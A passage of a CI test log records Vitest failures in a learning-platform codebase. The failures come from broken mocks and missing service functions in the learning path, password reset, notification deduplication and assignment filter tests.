2025-11-18T17:36:11.2283530Z [31m[1mAssertionError[22m: expected [Function] to throw error including 'Learning path not found' but got 'Failed to fetch learning path details…'[39m
2025-11-18T17:36:11.2284452Z 
2025-11-18T17:36:11.2284591Z - Expected
2025-11-18T17:36:11.2284884Z + Received
2025-11-18T17:36:11.2285046Z 
2025-11-18T17:36:11.2285224Z - Learning path not found
2025-11-18T17:36:11.2286221Z + Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:36:11.2307236Z 
2025-11-18T17:36:11.2307746Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[113/545]⎯[22m[39m
2025-11-18T17:36:11.2308090Z 
2025-11-18T17:36:11.2310187Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mPerformance Validation[2m > [22mshould use efficient RPC call instead of multiple queries
2025-11-18T17:36:11.2312860Z [31m[1mError[22m: Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:36:11.2314682Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2316033Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2317152Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2318239Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2318972Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2319437Z     [90m814| [39m    }
2025-11-18T17:36:11.2319825Z     [90m815| [39m  }
2025-11-18T17:36:11.2320843Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-validation.test.ts:[2m347:34[22m[39m
2025-11-18T17:36:11.2321491Z 
2025-11-18T17:36:11.2321866Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[114/545]⎯[22m[39m
2025-11-18T17:36:11.2322185Z 
2025-11-18T17:36:11.2324216Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mLogin with password reset required[2m > [22mshould redirect to change-password when password_change_required is true
2025-11-18T17:36:11.2339132Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mLogin with password reset required[2m > [22mshould redirect to profile if password is OK but profile incomplete
2025-11-18T17:36:11.2342472Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould show admin reset message when password_reset_by_admin is true
2025-11-18T17:36:11.2345552Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould update password and clear flags on successful change
2025-11-18T17:36:11.2348591Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould enforce password requirements
2025-11-18T17:36:11.2351468Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould redirect to dashboard if password change not required
2025-11-18T17:36:11.2353310Z [31m[1mTypeError[22m: vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:36:11.2354471Z [36m [2m❯[22m __tests__/integration/password-reset-flow.test.tsx:[2m27:26[22m[39m
2025-11-18T17:36:11.2355325Z     [90m 25| [39m  beforeEach(() => {
2025-11-18T17:36:11.2356219Z     [90m 26| [39m    vi.clearAllMocks();
2025-11-18T17:36:11.2387346Z     [90m 27| [39m    vi.mocked(useRouter).mockReturnValue(mockRouter as any);
2025-11-18T17:36:11.2388218Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.2388723Z     [90m 28| [39m  });
2025-11-18T17:36:11.2389104Z     [90m 29| [39m
2025-11-18T17:36:11.2389304Z 
2025-11-18T17:36:11.2389694Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[115/545]⎯[22m[39m
2025-11-18T17:36:11.2389999Z 
2025-11-18T17:36:11.2391862Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/learningPathsService.spec.ts[2m > [22mLearningPathsService[2m > [22mgetLearningPathDetailsForUser[2m > [22mshould return complete path details with progress when RPC succeeds
2025-11-18T17:36:11.2393990Z [31m[1mError[22m: Failed to fetch learning path details: assignmentQuery.maybeSingle is not a function[39m
2025-11-18T17:36:11.2395651Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2396709Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2397789Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2398854Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2399652Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2400415Z     [90m814| [39m    }
2025-11-18T17:36:11.2400860Z     [90m815| [39m  }
2025-11-18T17:36:11.2401763Z [90m [2m❯[22m __tests__/services/learningPathsService.spec.ts:[2m113:22[22m[39m
2025-11-18T17:36:11.2402325Z 
2025-11-18T17:36:11.2402765Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[116/545]⎯[22m[39m
2025-11-18T17:36:11.2403090Z 
2025-11-18T17:36:11.2404807Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/learningPathsService.spec.ts[2m > [22mLearningPathsService[2m > [22mgetLearningPathDetailsForUser[2m > [22mshould handle path with no courses correctly
2025-11-18T17:36:11.2414493Z [31m[1mError[22m: Failed to fetch learning path details: assignmentQuery.maybeSingle is not a function[39m
2025-11-18T17:36:11.2416360Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2417620Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2418547Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2419615Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2420377Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2420862Z     [90m814| [39m    }
2025-11-18T17:36:11.2421261Z     [90m815| [39m  }
2025-11-18T17:36:11.2422135Z [90m [2m❯[22m __tests__/services/learningPathsService.spec.ts:[2m187:22[22m[39m
2025-11-18T17:36:11.2422670Z 
2025-11-18T17:36:11.2423064Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[117/545]⎯[22m[39m
2025-11-18T17:36:11.2423610Z 
2025-11-18T17:36:11.2425331Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/learningPathsService.spec.ts[2m > [22mLearningPathsService[2m > [22mgetLearningPathDetailsForUser[2m > [22mshould throw error when learning path not found
2025-11-18T17:36:11.2428061Z [31m[1mAssertionError[22m: expected [Function] to throw error including 'Learning path not found' but got 'Failed to fetch learning path details…'[39m
2025-11-18T17:36:11.2428968Z 
2025-11-18T17:36:11.2429103Z - Expected
2025-11-18T17:36:11.2429390Z + Received
2025-11-18T17:36:11.2429551Z 
2025-11-18T17:36:11.2429722Z - Learning path not found
2025-11-18T17:36:11.2430518Z + Failed to fetch learning path details: assignmentQuery.maybeSingle is not a function
2025-11-18T17:36:11.2431072Z 
2025-11-18T17:36:11.2431723Z [36m [2m❯[22m __tests__/services/learningPathsService.spec.ts:[2m206:7[22m[39m
2025-11-18T17:36:11.2432428Z     [90m204| [39m      });
2025-11-18T17:36:11.2432830Z     [90m205| [39m
2025-11-18T17:36:11.2433275Z     [90m206| [39m      await expect(
2025-11-18T17:36:11.2433773Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2434645Z     [90m207| [39m        LearningPathsService.getLearningPathDetailsForUser(mockSupabas…
2025-11-18T17:36:11.2435629Z     [90m208| [39m      ).rejects.toThrow('Learning path not found');
2025-11-18T17:36:11.2436018Z 
2025-11-18T17:36:11.2436601Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[118/545]⎯[22m[39m
2025-11-18T17:36:11.2437100Z 
2025-11-18T17:36:11.2438900Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/learningPathsService.spec.ts[2m > [22mLearningPathsService[2m > [22mgetLearningPathDetailsForUser[2m > [22mshould handle RPC database errors gracefully
2025-11-18T17:36:11.2441624Z [31m[1mAssertionError[22m: expected [Function] to throw error including 'Failed to fetch learning path details…' but got 'Failed to fetch learning path details…'[39m
2025-11-18T17:36:11.2442627Z 
2025-11-18T17:36:11.2442772Z - Expected
2025-11-18T17:36:11.2443108Z + Received
2025-11-18T17:36:11.2443285Z 
2025-11-18T17:36:11.2443740Z - Failed to fetch learning path details: Database connection failed
2025-11-18T17:36:11.2444773Z + Failed to fetch learning path details: assignmentQuery.maybeSingle is not a function
2025-11-18T17:36:11.2445363Z 
2025-11-18T17:36:11.2446119Z [36m [2m❯[22m __tests__/services/learningPathsService.spec.ts:[2m229:7[22m[39m
2025-11-18T17:36:11.2447087Z     [90m227| [39m      });
2025-11-18T17:36:11.2447509Z     [90m228| [39m
2025-11-18T17:36:11.2447947Z     [90m229| [39m      await expect(
2025-11-18T17:36:11.2448447Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2449380Z     [90m230| [39m        LearningPathsService.getLearningPathDetailsForUser(mockSupabas…
2025-11-18T17:36:11.2450583Z     [90m231| [39m      ).rejects.toThrow('Failed to fetch learning path details: Databa…
2025-11-18T17:36:11.2451092Z 
2025-11-18T17:36:11.2451531Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[119/545]⎯[22m[39m
2025-11-18T17:36:11.2451878Z 
2025-11-18T17:36:11.2453746Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould generate consistent keys for same inputs
2025-11-18T17:36:11.2455504Z [31m[1mTypeError[22m: default.generateIdempotencyKey is not a function[39m
2025-11-18T17:36:11.2456539Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m39:40[22m[39m
2025-11-18T17:36:11.2457523Z     [90m 37| [39m      const userId = 'user-456';
2025-11-18T17:36:11.2458028Z     [90m 38| [39m
2025-11-18T17:36:11.2458826Z     [90m 39| [39m      const key1 = notificationService.generateIdempotencyKey(eventTyp…
2025-11-18T17:36:11.2459717Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2460630Z     [90m 40| [39m      const key2 = notificationService.generateIdempotencyKey(eventTyp…
2025-11-18T17:36:11.2461325Z     [90m 41| [39m
2025-11-18T17:36:11.2461513Z 
2025-11-18T17:36:11.2462132Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[120/545]⎯[22m[39m
2025-11-18T17:36:11.2462451Z 
2025-11-18T17:36:11.2464270Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould generate different keys for different users
2025-11-18T17:36:11.2466167Z [31m[1mTypeError[22m: default.generateIdempotencyKey is not a function[39m
2025-11-18T17:36:11.2467486Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m51:40[22m[39m
2025-11-18T17:36:11.2468424Z     [90m 49| [39m      const eventData = { feedback_id: 'test-123' };
2025-11-18T17:36:11.2468980Z     [90m 50| [39m
2025-11-18T17:36:11.2469766Z     [90m 51| [39m      const key1 = notificationService.generateIdempotencyKey(eventTyp…
2025-11-18T17:36:11.2470654Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2471588Z     [90m 52| [39m      const key2 = notificationService.generateIdempotencyKey(eventTyp…
2025-11-18T17:36:11.2472317Z     [90m 53| [39m
2025-11-18T17:36:11.2472523Z 
2025-11-18T17:36:11.2472901Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[121/545]⎯[22m[39m
2025-11-18T17:36:11.2472916Z 
2025-11-18T17:36:11.2474921Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould generate different keys for different events
2025-11-18T17:36:11.2475580Z [31m[1mTypeError[22m: default.generateIdempotencyKey is not a function[39m
2025-11-18T17:36:11.2476227Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m60:40[22m[39m
2025-11-18T17:36:11.2476564Z     [90m 58| [39m      const userId = 'user-456';
2025-11-18T17:36:11.2476912Z     [90m 59| [39m
2025-11-18T17:36:11.2477409Z     [90m 60| [39m      const key1 = notificationService.generateIdempotencyKey('new_fee…
2025-11-18T17:36:11.2477703Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2478277Z     [90m 61| [39m      const key2 = notificationService.generateIdempotencyKey('new_fee…
2025-11-18T17:36:11.2478447Z     [90m 62| [39m
2025-11-18T17:36:11.2478460Z 
2025-11-18T17:36:11.2478824Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[122/545]⎯[22m[39m
2025-11-18T17:36:11.2478836Z 
2025-11-18T17:36:11.2480416Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould handle different event types correctly
2025-11-18T17:36:11.2481003Z [31m[1mTypeError[22m: default.generateIdempotencyKey is not a function[39m
2025-11-18T17:36:11.2481598Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m69:47[22m[39m
2025-11-18T17:36:11.2481884Z     [90m 67| [39m      const userId = 'user-123';
2025-11-18T17:36:11.2482045Z     [90m 68| [39m
2025-11-18T17:36:11.2482576Z     [90m 69| [39m      const feedbackKey = notificationService.generateIdempotencyKey('…
2025-11-18T17:36:11.2482935Z     [90m   | [39m                                              [31m^[39m
2025-11-18T17:36:11.2483501Z     [90m 70| [39m      const assignmentKey = notificationService.generateIdempotencyKey…
2025-11-18T17:36:11.2484071Z     [90m 71| [39m      const messageKey = notificationService.generateIdempotencyKey('m…
2025-11-18T17:36:11.2484084Z 
2025-11-18T17:36:11.2484434Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[123/545]⎯[22m[39m
2025-11-18T17:36:11.2484446Z 
2025-11-18T17:36:11.2486245Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould handle unknown event types by hashing event data
2025-11-18T17:36:11.2487027Z [31m[1mTypeError[22m: default.generateIdempotencyKey is not a function[39m
2025-11-18T17:36:11.2487667Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m82:39[22m[39m
2025-11-18T17:36:11.2487969Z     [90m 80| [39m      const userId = 'user-789';
2025-11-18T17:36:11.2488347Z     [90m 81| [39m
2025-11-18T17:36:11.2488923Z     [90m 82| [39m      const key = notificationService.generateIdempotencyKey('unknown_…
2025-11-18T17:36:11.2489279Z     [90m   | [39m                                      [31m^[39m
2025-11-18T17:36:11.2489445Z     [90m 83| [39m
2025-11-18T17:36:11.2489752Z     [90m 84| [39m      expect(key).toBeTruthy();
2025-11-18T17:36:11.2489775Z 
2025-11-18T17:36:11.2490148Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[124/545]⎯[22m[39m
2025-11-18T17:36:11.2490160Z 
2025-11-18T17:36:11.2491786Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22msimpleHash[2m > [22mshould generate consistent hash for same string
2025-11-18T17:36:11.2492286Z [31m[1mTypeError[22m: default.simpleHash is not a function[39m
2025-11-18T17:36:11.2492903Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m93:41[22m[39m
2025-11-18T17:36:11.2493245Z     [90m 91| [39m      const str = 'test-string-123';
2025-11-18T17:36:11.2493411Z     [90m 92| [39m
2025-11-18T17:36:11.2493825Z     [90m 93| [39m      const hash1 = notificationService.simpleHash(str);
2025-11-18T17:36:11.2494122Z     [90m   | [39m                                        [31m^[39m
2025-11-18T17:36:11.2494507Z     [90m 94| [39m      const hash2 = notificationService.simpleHash(str);
2025-11-18T17:36:11.2494819Z     [90m 95| [39m
2025-11-18T17:36:11.2494833Z 
2025-11-18T17:36:11.2495208Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[125/545]⎯[22m[39m
2025-11-18T17:36:11.2495220Z 
2025-11-18T17:36:11.2498956Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22msimpleHash[2m > [22mshould generate different hashes for different strings
2025-11-18T17:36:11.2499573Z [31m[1mTypeError[22m: default.simpleHash is not a function[39m
2025-11-18T17:36:11.2500247Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m100:41[22m[39m
2025-11-18T17:36:11.2500457Z     [90m 98| [39m
2025-11-18T17:36:11.2501020Z     [90m 99| [39m    test('should generate different hashes for different strings', () …
2025-11-18T17:36:11.2501530Z     [90m100| [39m      const hash1 = notificationService.simpleHash('string-1');
2025-11-18T17:36:11.2501892Z     [90m   | [39m                                        [31m^[39m
2025-11-18T17:36:11.2502403Z     [90m101| [39m      const hash2 = notificationService.simpleHash('string-2');
2025-11-18T17:36:11.2502583Z     [90m102| [39m
2025-11-18T17:36:11.2502596Z 
2025-11-18T17:36:11.2502971Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[126/545]⎯[22m[39m
2025-11-18T17:36:11.2502985Z 
2025-11-18T17:36:11.2504555Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22msimpleHash[2m > [22mshould return string in base36 format
2025-11-18T17:36:11.2505076Z [31m[1mTypeError[22m: default.simpleHash is not a function[39m
2025-11-18T17:36:11.2505742Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m107:40[22m[39m
2025-11-18T17:36:11.2505924Z     [90m105| [39m
2025-11-18T17:36:11.2506380Z     [90m106| [39m    test('should return string in base36 format', () => {
2025-11-18T17:36:11.2507033Z     [90m107| [39m      const hash = notificationService.simpleHash('test');
2025-11-18T17:36:11.2507434Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2507609Z     [90m108| [39m
2025-11-18T17:36:11.2507971Z     [90m109| [39m      expect(typeof hash).toBe('string');
2025-11-18T17:36:11.2507984Z 
2025-11-18T17:36:11.2508343Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[127/545]⎯[22m[39m
2025-11-18T17:36:11.2508355Z 
2025-11-18T17:36:11.2509926Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mhashObject[2m > [22mshould generate consistent hash for same object
2025-11-18T17:36:11.2510701Z [31m[1mTypeError[22m: default.hashObject is not a function[39m
2025-11-18T17:36:11.2511322Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m119:41[22m[39m
2025-11-18T17:36:11.2511697Z     [90m117| [39m      const obj = { a: 1, b: 'test', c: true };
2025-11-18T17:36:11.2511862Z     [90m118| [39m
2025-11-18T17:36:11.2512402Z     [90m119| [39m      const hash1 = notificationService.hashObject(obj);
2025-11-18T17:36:11.2512749Z     [90m   | [39m                                        [31m^[39m
2025-11-18T17:36:11.2513200Z     [90m120| [39m      const hash2 = notificationService.hashObject(obj);
2025-11-18T17:36:11.2513366Z     [90m121| [39m
2025-11-18T17:36:11.2513377Z 
2025-11-18T17:36:11.2513740Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[128/545]⎯[22m[39m
2025-11-18T17:36:11.2513751Z 
2025-11-18T17:36:11.2515615Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mhashObject[2m > [22mshould generate same hash for objects with same content but different key order
2025-11-18T17:36:11.2516136Z [31m[1mTypeError[22m: default.hashObject is not a function[39m
2025-11-18T17:36:11.2516931Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m129:41[22m[39m
2025-11-18T17:36:11.2517363Z     [90m127| [39m      const obj2 = { c: true, a: 1, b: 'test' };
2025-11-18T17:36:11.2517785Z     [90m128| [39m
2025-11-18T17:36:11.2518320Z     [90m129| [39m      const hash1 = notificationService.hashObject(obj1);
2025-11-18T17:36:11.2518704Z     [90m   | [39m                                        [31m^[39m
2025-11-18T17:36:11.2519192Z     [90m130| [39m      const hash2 = notificationService.hashObject(obj2);
2025-11-18T17:36:11.2519409Z     [90m131| [39m
2025-11-18T17:36:11.2519425Z 
2025-11-18T17:36:11.2519844Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[129/545]⎯[22m[39m
2025-11-18T17:36:11.2519866Z 
2025-11-18T17:36:11.2521634Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mhashObject[2m > [22mshould generate different hashes for different objects
2025-11-18T17:36:11.2522182Z [31m[1mTypeError[22m: default.hashObject is not a function[39m
2025-11-18T17:36:11.2522871Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m139:41[22m[39m
2025-11-18T17:36:11.2523292Z     [90m137| [39m      const obj2 = { a: 2, b: 'test' };
2025-11-18T17:36:11.2523494Z     [90m138| [39m
2025-11-18T17:36:11.2523984Z     [90m139| [39m      const hash1 = notificationService.hashObject(obj1);
2025-11-18T17:36:11.2524364Z     [90m   | [39m                                        [31m^[39m
2025-11-18T17:36:11.2524860Z     [90m140| [39m      const hash2 = notificationService.hashObject(obj2);
2025-11-18T17:36:11.2525067Z     [90m141| [39m
2025-11-18T17:36:11.2525093Z 
2025-11-18T17:36:11.2525504Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[130/545]⎯[22m[39m
2025-11-18T17:36:11.2525538Z 
2025-11-18T17:36:11.2527685Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Event Processing[2m > [22mFeedback notification deduplication[2m > [22mshould prevent duplicate feedback notifications
2025-11-18T17:36:11.2528349Z [31m[1mTypeError[22m: default.generateIdempotencyKey is not a function[39m
2025-11-18T17:36:11.2529059Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m213:40[22m[39m
2025-11-18T17:36:11.2529265Z     [90m211| [39m
2025-11-18T17:36:11.2529824Z     [90m212| [39m      // Test that the same feedback event generates the same idempote…
2025-11-18T17:36:11.2530467Z     [90m213| [39m      const key1 = notificationService.generateIdempotencyKey('new_fee…
2025-11-18T17:36:11.2530884Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2531501Z     [90m214| [39m      const key2 = notificationService.generateIdempotencyKey('new_fee…
2025-11-18T17:36:11.2531895Z     [90m215| [39m
2025-11-18T17:36:11.2531909Z 
2025-11-18T17:36:11.2532289Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[131/545]⎯[22m[39m
2025-11-18T17:36:11.2532301Z 
2025-11-18T17:36:11.2534280Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Event Processing[2m > [22mFeedback notification deduplication[2m > [22mshould allow notifications for different feedback items
2025-11-18T17:36:11.2534988Z [31m[1mTypeError[22m: default.generateIdempotencyKey is not a function[39m
2025-11-18T17:36:11.2535698Z [36m [2m❯[22m __tests__/services/notificationService.spec.ts:[2m232:40[22m[39m
2025-11-18T17:36:11.2535955Z     [90m230| [39m      };
2025-11-18T17:36:11.2536143Z     [90m231| [39m
2025-11-18T17:36:11.2536736Z     [90m232| [39m      const key1 = notificationService.generateIdempotencyKey('new_fee…
2025-11-18T17:36:11.2537299Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2537899Z     [90m233| [39m      const key2 = notificationService.generateIdempotencyKey('new_fee…
2025-11-18T17:36:11.2538092Z     [90m234| [39m
2025-11-18T17:36:11.2538105Z 
2025-11-18T17:36:11.2538478Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[132/545]⎯[22m[39m
2025-11-18T17:36:11.2538490Z 
2025-11-18T17:36:11.2540256Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableSchools[2m > [22mshould return all schools for admin users
2025-11-18T17:36:11.2540890Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2541490Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m41:21[22m[39m
2025-11-18T17:36:11.2541686Z     [90m 39| [39m      });
2025-11-18T17:36:11.2541866Z     [90m 40| [39m
2025-11-18T17:36:11.2542296Z     [90m 41| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2542594Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2542782Z     [90m 42| [39m
2025-11-18T17:36:11.2543310Z     [90m 43| [39m      const result = await getAvailableSchools('admin-123', 'admin');
2025-11-18T17:36:11.2543330Z 
2025-11-18T17:36:11.2543700Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[133/545]⎯[22m[39m
2025-11-18T17:36:11.2543713Z 
2025-11-18T17:36:11.2545359Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableSchools[2m > [22mshould return only assigned schools for consultants
2025-11-18T17:36:11.2546016Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2546596Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m69:21[22m[39m
2025-11-18T17:36:11.2546974Z     [90m 67| [39m      });
2025-11-18T17:36:11.2547156Z     [90m 68| [39m
2025-11-18T17:36:11.2547579Z     [90m 69| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2547865Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2548058Z     [90m 70| [39m
2025-11-18T17:36:11.2548591Z     [90m 71| [39m      const result = await getAvailableSchools('consultant-123', 'cons…
2025-11-18T17:36:11.2548605Z 
2025-11-18T17:36:11.2548963Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[134/545]⎯[22m[39m
2025-11-18T17:36:11.2548974Z 
2025-11-18T17:36:11.2550465Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/assignmentFilters.test.js[2m > [22mAssignment Filters Utilities[2m > [22mgetAvailableSchools[2m > [22mshould handle errors gracefully
2025-11-18T17:36:11.2551166Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.2551793Z [36m [2m❯[22m __tests__/utils/assignmentFilters.test.js:[2m96:21[22m[39m
2025-11-18T17:36:11.2552006Z     [90m 94| [39m      });
2025-11-18T17:36:11.2552195Z     [90m 95| [39m
2025-11-18T17:36:11.2552644Z     [90m 96| [39m      supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.2552983Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2553486Z     [90m 97| [39m
2025-11-18T17:36:11.2554043Z     [90m 98| [39m      const result = await getAvailableSchools('admin-123', 'admin');
2025-11-18T17:36:11.2554057Z 
2025-11-18T17:36:11.2554435Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[135/545]⎯[22m[39m
2025-11-18T17:36:11.2554447Z 
